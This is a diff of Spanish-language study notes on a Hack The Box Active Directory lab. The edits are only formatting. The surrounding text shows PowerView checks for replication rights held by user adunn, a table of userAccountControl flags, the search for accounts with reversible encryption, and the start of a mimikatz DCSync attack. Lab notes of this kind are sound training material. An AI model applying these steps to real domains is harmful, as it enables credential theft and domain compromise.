@@ -18,8 +18,7 @@ Es habitual durante una auditoría encontrar cuentas que, sin ser administradore
 ##### Usando `Get-DomainUser` para ver la membrería de grupo de `adunn`
 
 ```powershell
-PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
-
+PS C:\htb> Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
 
 samaccountname     : adunn
 objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
@@ -31,7 +30,6 @@ useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
 ```
 
 PowerView puede utilizarse para verificar que este usuario estándar tiene realmente asignados los permisos necesarios. Primero se obtiene el SID del usuario y luego se consultan todas las ACLs definidas sobre el objeto del dominio (`DC=inlanefreight,DC=local`) utilizando `Get-ObjectAcl`. En este caso, se busca específicamente si existen derechos de replicación y si el usuario `adunn` (referenciado en el comando como `$sid`) los posee. El resultado confirma que efectivamente cuenta con dichos permisos.
-
 ##### Usando `Get-ObjectAcl` para comprobar los privilegios de replicación de `adunn`
 
 ```powershell-session
@@ -113,17 +111,17 @@ UserPrincipalName  :
 
 Hay que tener en cuenta que `userAccountControl` es un atributo de tipo bitmask que contiene múltiples banderas (flags) para describir el estado y configuración de una cuenta de usuario en AD. Cada opción es un valor binario.
 
-|Flag|Valor|
-|---|---|
-|SCRIPT|1|
-|ACCOUNTDISABLE|2|
-|HOMEDIR_REQUIRED|8|
-|LOCKOUT|16|
-|PASSWD_NOTREQD|32|
-|PASSWD_CANT_CHANGE|64|
-|**PASSWORD_ENCRYPTED_TEXT_ALLOWED**|**128**|
-|NORMAL_ACCOUNT|512|
-|DONT_EXPIRE_PASSWORD|65536|
+| Flag                                | Valor   |
+| ----------------------------------- | ------- |
+| SCRIPT                              | 1       |
+| ACCOUNTDISABLE                      | 2       |
+| HOMEDIR_REQUIRED                    | 8       |
+| LOCKOUT                             | 16      |
+| PASSWD_NOTREQD                      | 32      |
+| PASSWD_CANT_CHANGE                  | 64      |
+| **PASSWORD_ENCRYPTED_TEXT_ALLOWED** | **128** |
+| NORMAL_ACCOUNT                      | 512     |
+| DONT_EXPIRE_PASSWORD                | 65536   |
 
 Podemos ver que existe una cuenta, `proxyagent`, que tiene cifrado reversible activado con PowerView:
 
@@ -156,7 +154,7 @@ Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
 
 Desde la nueva sesión abierta con powershell podemos acontecer el ataque:
 
-```powershell-session
+```powershell
 PS C:\htb> .\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
